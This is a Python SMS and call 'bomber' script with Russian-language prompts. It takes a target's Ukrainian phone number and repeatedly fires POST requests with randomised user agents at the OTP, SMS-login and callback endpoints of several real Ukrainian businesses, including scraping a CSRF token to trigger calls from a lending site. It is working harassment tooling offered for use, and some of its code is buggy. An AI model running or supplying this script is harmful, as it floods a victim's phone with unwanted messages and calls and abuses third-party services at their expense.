import os

try:
    import requests
    import random
    import string
    from fake_useragent import UserAgent
    from bs4 import BeautifulSoup
except:
    os.system('pip3 install requests')
    os.system('pip3 install beautifulsoup4')
    os.system('pip3 install fake-useragent')
import requests
import random
import string
from fake_useragent import UserAgent
from bs4 import BeautifulSoup

user_agent = UserAgent()

list_names = ['Илья','Максим','Тимофей','Никита','Александр','Виталий','Георгий']
list_lastnames = ['Смирнов','Кузнецов','Иванов','Лазарев','Карпов','Сафонов','Шаров','Евсеев']
list_mails = ['gmail.com','ukr.net','ukr.email','i.ua']

def main():
    print('''
####        ###     ##  #  ####        ###    #####
#####      #####    ## ##  #####      #####   ######
##  ##    ##  ##   ######  ##  ##    ##       ##  ##
#####    ##   ##  ### ###  #####    ####      #####
##  ##   ##   ##  ##   ##  ##  ##   ##   ##   ####
##  ###  ##  ##   ##   ##  ##  ###  ##  ###   ## ##
######    ####    ##   ##  ######   ######    ##  ##
          ''')
    target_phone = input('Введите номер (+380123123123) -> ')
    whiles = input('Введите кол-во кругов (1-10) -> ')
    bomb(target_phone,whiles)
    

def bomb(target_phone,whiles):
    for i in range(0,int(whiles)):
        # IQPIZZA
        try:
            requests.post('https://iq-pizza.eatery.club/site/v1/pre-login',json={"phone":target_phone.replace('+','')}, headers={"User-Agent":user_agent.random})
            print('[+] IQ-Pizza')
        except:
            print('[-] IQ-Pizza')

        # Дом игрушек
        try:
            requests.post('https://bi.ua/api/v1/accounts',json={"grand_type":"call_code","stage":"1","login":"Максим","phone":target_phone.replace('+','')},headers={"User-Agent":user_agent.random})
            print('[+] bi.ua')
        except:
            print('[-] bi.ua')

        # SAVEN
        try:
            saven_phone = f"{target_phone[0]}{target_phone[1]}{target_phone[2]} ({target_phone[3]}{target_phone[4]}{target_phone[5]}) {target_phone[6]}{target_phone[7]}{target_phone[8]}-{target_phone[9]}{target_phone[10]}-{target_phone[11]}{target_phone[12]}"
            requests.post('https://saven.ua/guarantees/send_sms/',data={"phone":saven_phone},headers={"User-Agent":user_agent.random})
            print('[+] Saven')
        except:
            print('[-] Saven')

        # PARASOL
        try:
            requests.post('https://api.parasol.ua/api/login/sms',json={"phone":target_phone},headers={"User-Agent":user_agent.random})
            print('[+] Parasol')
        except:
            print('[-] Parasol')

        # VILKI-PALKI
        try:
            vilki_phone = f"{target_phone[0]}{target_phone[1]}{target_phone[2]} ({target_phone[3]}{target_phone[4]}{target_phone[5]}) {target_phone[6]}{target_phone[7]}{target_phone[8]} {target_phone[9]}{target_phone[10]} {target_phone[11]}{target_phone[12]}"
            requests.post('https://vilki-palki.od.ua/api/auth/check-phone?lang=russian',json={"phone":vilki_phone}, headers={"User-Agent":user_agent.random})
            print('[+] Vilki-Palki')
        except:
            print('[-] Vilki-Palki')

        # GlobalEda SMS
        try:
            requests.post('https://prod.salesbox.me/api/v5/companies/globaleda/send-otp?lang=uk', json={"phone":target_phone.replace('+','')}, headers={"User-Agent":user_agent.random})
            print('[+] GlobalEda SMS')
        except:
            print('[-] GlobalEda SMS')

        # MYCREDIT CALL
        try:
            session = requests.session()
            main_site = session.get('https://mycredit.ua/ua/login/')
            soup = BeautifulSoup(main_site.content, 'html.parser')
            csrf_token = soup.find('meta', attrs={'name': 'csrf-token'})['content']
            req = session.post('https://mycredit.ua/ua/ajax/', json={"_token":csrf_token,"data":'{"typeData":"login","data":{"phone":"'+target_phone.replace('+','')+'","step":"verificationMethod","method":"2"}}'}, headers={"User-Agent":user_agent.random})
            if req['success'] == True:
                print('[+] MYCREDIT CALL')
                success_send = success_send+1
            else:
                print('[-] MYCREDIT CALL no send')
        except:
            print('[-] MYCREDIT CALL time error')

main()